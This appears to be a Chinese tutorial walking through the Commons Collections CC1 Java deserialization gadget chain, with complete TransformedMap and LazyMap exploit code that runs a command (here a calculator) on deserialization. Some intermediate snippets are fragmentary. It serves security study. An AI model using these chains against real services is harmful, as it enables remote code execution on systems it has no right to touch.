一、Java Commons Collections1 分析

1、前置知识

前置知识看不懂无所谓,因为一开始也看着蒙圈,先有个映像,最后在实际追溯调用的时候回头来看看并跟着实际利用理解这些前置知识

版本依赖:

commons-collections : 3.1
TransformedMap - jdk < 8u71

1.1、AbstractMapDecorator

首先 CC 库中提供了一个抽象类 org.apache.commons.collections.map.AbstractMapDecorator ,这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map。这个类有很多实现类，各个类触发的方式不同，重点关注的是 TransformedMap 以及 LazyMap

1.2、Transformer 接口

Transfomer 是 Apache Commons Collections 库引入的一个接口，每个具体的 Transformer 类必须实现 Transformer 接口

其作用就是接收一个对象,然后调用 transform() ⽅法,该方法用来定义具体的转换逻辑,可以看到他不同的实现类

1.3、TransformedMap

org.apache.commons.collections.map.TransformedMap 类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入, Transformer 实现类分别绑定到 map 的 key 和 value 上，当 map 的 key 或 value 被修改时，会调用对应 Transformer 实现类的 transform() 方法

Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

代码示例:

准备一个自己写的 MyTransformer 实现 Transformer 接口和 Serializable 接口

public class MyTransformer implements Transformer, Serializable {
    private String name;

    /**
     * protected修饰的构造方法,给成员变量赋值
     * */
    protected MyTransformer(String name) {
        System.out.println("in MyTransformer:MyTransformer()");
        this.name = name;
    }

    /**
     * 使用 getInstance 方法创建对象
     */
    public static Transformer getInstance(String name) {
        System.out.println("in MyTransformer:getInstance()");
        return new MyTransformer(name);
    }

    /**
     * 重写Transformer接口的transform方法
     * */
    @Override
    public Object transform(Object input) {
        System.out.println("in MyTransformer:transform()");
        System.out.println("input is : " + input);
        return this.name;
    }
}

准备测试类:

public class MyTransformerTest {
    public static void main(String[] args) {
        // 调用 getInstance 方法获取一个 MyTransformer 实例
        MyTransformer myTransformer = (MyTransformer) MyTransformer.getInstance("trans-value");

        // 创建map集合
        HashMap map = new HashMap();

        // 即当 map 的 value 更改时,自动调用 MyTransformer 的 transform 方法

1.4、ConstantTransformer

ConstantTransformer 是实现了 Transformer 接⼝的⼀个类，它的过程就是在构造方法的时候传⼊⼀个对象，并在 transform ⽅法将这个对象再返回,其作用就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作,这个类用于和 ChainedTransformer 配合，将其结果传入 InvokerTransformer 来调用我们指定的类的指定方法

1.5、ChainedTransformer

org.apache.commons.collections.functors.ChainedTransformer 类也是 Transformer 接口的其中一个实现类，但是这个类自己维护了一个 Transformer 数组， 在调用 ChainedTransformer 的 transform 方法时，会循环数组，依次调用 Transformer 数组中每个 Transformer 的 transform 方法，并将结果传递给下一个 Transformer,链式调用

官方说明:

将指定的转换器连接在一起的转化器实现。
    输入的对象将被传递到第一个转化器，转换结果将会输入到第二个转化器，并以此类推

1.6、InvokerTransformer

这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，我们来看一下它的 transfrom 方法，方法注释写的很清楚，通过调用 input 的方法，并将方法返回结果作为处理结果进行返回

写个代码尝试下

import org.apache.commons.collections.functors.InvokerTransformer;

        Runtime runtime = Runtime.getRuntime();

        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"}).transform(runtime);
    }

2.1、TransformedMap#checkSetValue

攻击链从入口到最终能命令执行需要满足的条件

1.一路从头到最后命令执行的类都要能反序列化

2.入口类能接受任意对象,执行 readObject 方法

流程从入口 -> 最终的危险方法,通过上面的前置知识,其实已经找到了危险方法 InvokerTransformer 的 transform 方法,那么就可以倒推看下谁调用了,通过 FindUsage 找到 21 个使用的,那么最终的目标是要找到入口的 readObject() 方法里

比如找到了 TransformedMap 类中 checkValue 方法调用了 transform 方法

然后看下 valueTransformer 是什么

看下该类的构造函数,可以看到 valueTransformer 值来源,但是这个构造方法是 protected 修饰的,只能自己调用

然后看下哪里调用了该方法,可以看到 decorate() 方法中直接 new 了一个 TransformedMap 对象并 return 返回

写个代码测试一下

打上断点,可以看到这里传进来的是 InvokerTransformer 对象,那么走到 checkSetValue() 的地方就相当于调用了 InvokerTransformer 的 transformer,那么接下来只要关注谁调用了 checkSetValue() 方法和 value 是否可控就行了

跟进看下 AbstractInputCheckedMapDecorator 类是 TransformedMap 的父类,是个抽象类,这里的 entry 就是迭代遍历,将键值对封装成一个对象,所以在遍历的时候就会调用 checkSetValue() 方法

下断点调试看看,走到 setValue 方法,这里传入的 value 是我们手动可控的,传入了 runtime 对象

然后走进了 checkSetValue 方法, valueTransformer 已经是我们传入的 invokerTransformer

Map<Object, Object> decorate = TransformedMap.decorate(map, null, invokerTransformer);

然后 invokerTransformer 调用它自己的 transform 方法 ,将 runtime 对象传入

最后通过反射执行了命令,至此证明该链是可以使用的,接下来就是找谁的 readObject() 方法中调用了 setValue() 方法

找到了 AnnotationInvocationHandler 类在 readObject() 方法中调用了

看到其构造方法,该构造方法接收两个参数，第一个参数是继承了 Annotation 注解泛型的 Class 对象，第二个参数是是一个 Map 集合,其 key 为 String 类型、value 为 Object 类型。构造方法先获取 type 变量的父接口，然后判断 type 是否是接口类型且仅有一个父类接口,并且父类接口是 Annotation.class ,才会将两个参数初始化在成员变量 type 和 memberValues 中,第二个参数 Map 类型,该参数是我们可控的,但该构造方法也不是公共的,并且该类也是默认 deafult 修饰,只能本包中访问,所以只能通过反射来调用

看到 readObject() 方法,可以看到 memberValues 关乎到最后控制 setValue 方法,这里先记着,眼下要先解决如何走到 readObecjt,那么就需要反序列化该类,反序列的时候会自动走到该类自己的 readObject() 方法

此时就有三个问题

1.Runtime 类是无法序列化的,他没有实现 Serializable 接口,只能通过反射进行调用

2.两个if的判断满足

3.setValue() 需要传 runtime 对象,但其实这里的 setValue() 传的是 new AnnotationTypeMismatchExceptionProxy

先解决第一个问题, Runtime 类的反射调用问题,先看下常规的反射调用

// 1.Class 类实现了 Serializable 接口,所以直接通过名字来反射
Class clazz = Runtime.class;

// 2.反射调用 getRuntime() 方法
Method getRuntimeMethod = clazz.getMethod("getRuntime", null);

// 3.获得 Runtime 对象
// 静态方法,第一个obj为null,这个方法没有参数所以也是null
Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);

// 4.获得 exec 方法
Method execMethod = clazz.getMethod("exec", String.class);

// 5.执行命令
execMethod.invoke(r,"open -a Calculator");

再改成用 InvokerTransformer 方式, InvokerTransformer 的 transform 就是反射调用

// InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)
// 第一个参数:方法名字 第二个参数:参数类型 第三个参数:参数值
// transform 要传入Obejct,也就是Runtime.class,调用getMethod方法,没有参数数所以为null
// 这一步相当于调用了getRuntime()方法
Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);

 // 调用getRuntimeMethod的invoke方法获取runtime对象 invoke方法的参数类型
Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);

// 反射调用exec方法
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"}).transform(r);

这里发现一个规律,就是后一个调用前一个,通过 transform 进行循环调用

transform(r) //执行exec

transform(getRuntimeMethod) // 通过getRuntimeMethod 获取Runtime对象

transform(Runtime.class) // 通过反射 Runtime.class 的 getMethod 方法获取 getRuntime 方法

联想到上面提到过的 ChainedTransformer 链式调用,看下其构造方法,传进去一个 Transformer[] 数组,赋值给成员变量 iTransformers,然后 transform 方法就是循环遍历并调用,那么就先定义一个 Transformer[] 数组传到其构造方法中，然后再调用 transform 方法循环遍历调用

注意:这里可能会有疑问, Transformer 明明是接口为什么可以 new ?

其实这里并不是new了一个接口，而是new了一个 Transformer 类型的数组，里面存储的是 Transformer 的实现类对象

实际代码:

Transformer[] transformers = new Transformer[]{

public class CC1Test {

        Transformer[] transformers = new Transformer[]{

                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };
        // 这里的transform就写我们最开始可控的输入,也即是Runtime.class,因为一系列的操作都是先从Runtime.class 开始

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap map = new HashMap();
        map.put("key", "value");
        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        // 反射获取 AnnotationInvocationHandler 类
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 构造方法也不是共有的,所以需要使用 getDeclaredConstructor() 方法来获取
        Constructor annoConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        // 设置访问权限
        annoConstructor.setAccessible(true);
        // 实例化,传入参数(注解类型参数,map类型参数)
        Object o = annoConstructor.newInstance(Override.class, transformedMap);
        serialize(o);
        unSerialize("src/main/java/ser.ser");

    }
    
    // 序列化
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("src/main/java/ser.ser"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        objectOutputStream.close();
    }

    // 反序列化
    public static Object unSerialize(String fileName) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = objectInputStream.readObject();
        objectInputStream.close();
        return obj;
    }
}

在 if 处打上断点调试下,看看是否走进了 if 判断

分析下代码,首先调用 AnnotationType.getInstance(type) 方法来获取 type 这个注解类对应的 AnnotationType 的对象，然后获取 Override 注解的成员类型存到 Map 集合中,然后遍历这个 Map 并取其 Key,然后走进判断,根据手动传进去的 Map 集合的 key 来找注解中成员的类型

跟着流程走下去,发现了几个问题

1.Override 注解没有成员变量

2.map集合传的键为 key,Override 注解中也没有这个 key 成员,也更加获得不到他的类型

解决办法:

构造一个 AnnotationInvocationHandler 实例，初始化时传入一个注解类和一个 Map，这个 Map 的 key 中要有注解类中存在的属性，但是值不是对应的实例，也不是 ExceptionProxy 对象

这里我们使用 Target 注解,并把 key 变成 value,这样就能走进循环

这里根据键值 value 找到了注解成员,并成功获取了其类型,并且值不是对应的实例或者 ExceptionProxy 对象所以两个 if 都通过了

注意:不是一定要使用 Target.class 的 value 属性来触发，其实用什么都行，找任意一个有属性的注解都可以，然后 key 值写上属性名字,比如使用 Generated.class 的 comments 属性也是可以的

那么就来到第三个问题,这里 setValue 传的东西跟进看下,可以看到这里传进来的 Object value 不是 runtime

这里的 valueTransformer 就是我们传进来的 chainedTransformer

valueTransformer.transform(value)

Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

那么如何解决这个 value 的问题,就要使用 ConstantTransformer 的 transform 方法,他的作用就是获取对象然后返回该对象

修改下 Transformer[] 数组,那么为什么这样就可以呢?思考一下,过程会走到 TransformedMap 的 checkSetValue 方法,那么此时 valueTransformer 是我们自己设置的 chainedTransformer,那么 chainedTransformer 执行自己的 transform 方法后,就会开始遍历 Transformer[] 数组,遍历第一个数组 new ConstantTransformer(Runtime.class) 就会返回 Runtime 对象,再进行链式调用

最终的代码:

public class CC1Test {
    public static void main(String[] args) throws Exception {
        // 构造 transformers 数组
        Transformer[] transformers = new Transformer[]{
                // 返回 Runtime 对象
                new ConstantTransformer(Runtime.class),
                // 获取 getRuntime 方法
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                // 执行 getRuntime 方法获取 Runtime 对象
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                // 执行 exec 
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };
        // 这里的transform就写我们最开始可控的输入,也即是Runtime.class,因为一系列的操作都是先从Runtime.class 开始
        // 先通过 InvokerTransformer的transform中的 input.getClass() 开始
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap map = new HashMap();
        // 此处 key=value 是Target注解中有的注解成员
        map.put("value", "value");
        // 用 chainedTransformer 包装 map 集合
        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        // 反射获取 AnnotationInvocationHandler 类
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 构造方法也不是共有的,所以需要使用 getDeclaredConstructor() 方法来获取
        Constructor annoConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        // 设置访问权限
        annoConstructor.setAccessible(true);
        // 实例化,传入参数(注解类型参数,map类型参数)
        Object o = annoConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unSerialize("src/main/java/ser.ser");
    }

    // 序列化
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("src/main/java/ser.ser"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        objectOutputStream.close();
    }

    // 反序列化
    public static Object unSerialize(String fileName) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = objectInputStream.readObject();
        objectInputStream.close();
        return obj;
    }
}

2.3.1、Java 动态代理

这条线需要用到动态代理的相关知识,所以先做一个前置知识

作为一门静态语言，如果想劫持一个对象内部的方法调用就需要用到 java.reflect.Proxy,动态代理的关键有两个，在 JDK 中，Java 提供了 Java.lang.reflect.InvocationHandler 接口和 Java.lang. reflect.Proxy 类，这是实现动态代理的核心

Proxy.newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h)生成一个代理对象

  - 参数1:ClassLoader loader 被代理对象的类加载器 
  - 参数2:Class<?>[] interfaces 被代理对象要实现的接口 
  - 参数3:InvocationHandler h (接口)执行处理类
  - 返回值: 代理对象
  - 前2个参数是为了帮助在jvm内部生成被代理对象的代理对象,第3个参数,用来监听代理对象调用方法,帮助我们调用方法

InvocationHandler 接口:

主要方法为 Objectinvoke（Object proxy, Method method, Object[] args），该方法定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用

Objectinvoke（Object proxy, Method method, Object[] args）

InvocationHandler中的Object invoke(Object proxy, Method method, Object[] args)方法：调用代理类的任何方法，此方法都会执行
  - 参数1:代理对象
  - 参数2:当前执行的方法
  - 参数3:当前执行的方法运行时传递过来的参数
  - 返回值:当前方法执行的返回值

这里举个例子:

准备一个 Hello 接口:

public interface Hello {
    void sayHello();

    void sayGoodbye();
}

准备一个实现 Hello 接口的类:

public class TestHello implements Hello {
    @Override
    public void sayHello() {
        System.out.println("Hello World");
    }

    @Override
    public void sayGoodbye() {
        System.out.println("Goodbye");
    }
}

外部动态代理调用类:

public class HelloProxyTest {
    public static void main(String[] args) {
        // 创建 TestHello 对象
        TestHello testHello = new TestHello();
        // TestHello.class.getClassLoader():被代理对象的类加载器
        // TestHello.class.getInterfaces():被代理对象的要实现的接口
        // InvocationHandler h (接口):执行处理类
        // 这里被代理什么接口，就是什么类型
        Hello proxy = (Hello) Proxy.newProxyInstance(TestHello.class.getClassLoader(), TestHello.class.getInterfaces(), new InvocationHandler() {
            @Override
            // Object proxy:就是代理对象
            // Method method:需要被代理的方法
            // Object[] args:当前执行的方法运行时传递过来的参数
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                // 因为只增强sayHello方法,所以加个判断
                if (method.getName().equals("sayHello")) {
                    System.out.println("Hello World v2");
                    // 参数1: 调用方法的对象 这里调用方法的对象就是testHello
                    // 参数2: 调用方法时传递的实际参数 此处没有参数
                    // 返回值: 执行的方法的返回值 此处没有返回值
                    method.invoke(testHello);
                }
                return null;
            }
        });
        proxy.sayHello();
        //proxy.sayGoodbye();
    }
}

这里引出动态代理的特性:

动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。是因为所有被代理执行的方法，都是通过在InvocationHandler中的invoke方法调用的，所以我们只要在invoke方法中统一处理，就可以对所有被代理的方法进行相同的操作了

这里怎么理解这句话,首先这里被代理的类 TestHello 类,类中有两个方法 sayHello 和 sayGoodbye,那么这里可以看到用增强后的 proxy 最后调用了 sayHello 方法,结合上面一句话 所有被代理执行的方法，都是通过在InvocationHandler中的invoke方法调用的, 那么不难理解也就是说只要执行了被代理类中的任意方法都会走到 InvocationHandler 的 invoke() 方法中,那么继续看,此时走到 invoke 中,此时的 Object 就是 proxy, Method 就是 sayHello() 方法,没有参数,那么该代码中是进行了 if 判断,判断了传进来的 method 是不是 sayHello,是才往下执行,那么此时,如果我不加上判断,调用 sayGoodbye(),我还能不能输出 Hello World v2 这句话呢?

可以看到成功执行并输出,这就完美诠释了只要 代理类 调用被代理类中的任意方法,都会走到 invoke() 方法中

那么再看下一个例子:这里使用P神的例子,更佳贴合 cc1 链

这里准备一个 InvocationHandler 的实现类,这里要注意上面的例子是我们自己手动 new InvocationHandler(),而这里 ExampleInvocationHandler 实现了 InvocationHandler 接口,那么其实 ExampleInvocationHandler 就是一个 InvocationHandler 接口(父接口多态)

public class ExampleInvocationHandler implements InvocationHandler {

    protected Map map;

    public ExampleInvocationHandler(Map map) {
        this.map = map;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().compareTo("get") == 0) {
            System.out.println("Hook method: " + method.getName());
            return "Hacked Object";
        }
        return method.invoke(this.map, args);
    }
}

可以看到,这里把 ExampleInvocationHandler 对象作为 new InvocationHandler() 带入了 Proxy中,那么这里就会走到 handler 对象中的 invoke 方法

2.3.2、攻击链分析

其实在分析 TransformedMap 的时候也看到了 LazyMap,那么就来跟着工具的利用链来分析,先来看看 LazyMap 类

get 方法中使用了 transform() 方法,这里有个 if 判断,当调用get(key) 的 key 不存在时，会走进该 if 中,根据注释来翻译,如果键当前不在 map 中，则为键创键值

并且该方法也是通过 decorate 来创建对象的,传递两个参数,第一个 Map 类型的,第二个 Factory 类型的,构造方法也是 protected 修饰了,和 TransformedMap 基本类似

构造下代码:

public class LazyMapTest {

                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),

                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };

        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");

最后调用 get() 方法触发 transform

然后两个思路,要么追踪 readObject() 方法里直接使用 get 方法的,要么就再找哪个类里使用了 get() 方法,然后再追使用了 get() 方法的方法谁调用了,这里就不墨迹了,直接看到 AnnotationInvocationHandler 类中的 invoke() 方法,当中 memberValues 使用了 get() 方法

要触发 invoke() 方法就需要用到动态代理AnnotationInvocationHandler 该类也实现了 InvocationHandler,其本身就可以作为一个使用动态代理,代理对象调用任意方法,代理的 invoke 方法都会执行,但是我们的入口地方是 readObject() 方法

看到 readObject() 方法中 memberValues 是我们可控传入的,是一个 Map 集合,那么我们只要动态代理 Map 集合,并把 AnnotationInvocationHandler 作为 new InvocationHandler 带入,再用 AnnotationInvocationHandler 构造方法,对这个 proxyMap 进行包裹带入,当他调用了 entrySet 方法后,就会执行到 AnnotationInvocationHandler 的 invoke 方法

最终代码如下:

public class LazyMapTest {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");

        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        // 反射 AnnotationInvocationHandler 
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 获得构造方法
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        // 设置访问权限
        constructor.setAccessible(true);
        // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例,把其作为 handler
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap);
        // 创建 Map 的动态代理类实例，带入hander,如果触发了mapProxy触发了被代理对象的任意方法,就会触发handler中的invoke方法,也就是 AnnotationInvocationHandler 中的 invoke方法
        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        // 因为入口是readObject(),还是需要把mapProxy带入,赋值给 memberValues 
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);
        //序列化
        serialize(invocationHandler);
        // 反序列化 走到readObject() 方法,此时 memberValues 被赋值为mapProxy,然后调用entrySet触发invoke
        unSerialize("src/main/java/ser.ser");

    }

    // 序列化
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("src/main/java/ser.ser"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        objectOutputStream.close();
    }

    // 反序列化
    public static Object unSerialize(String fileName) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = objectInputStream.readObject();
        objectInputStream.close();
        return obj;
    }
}
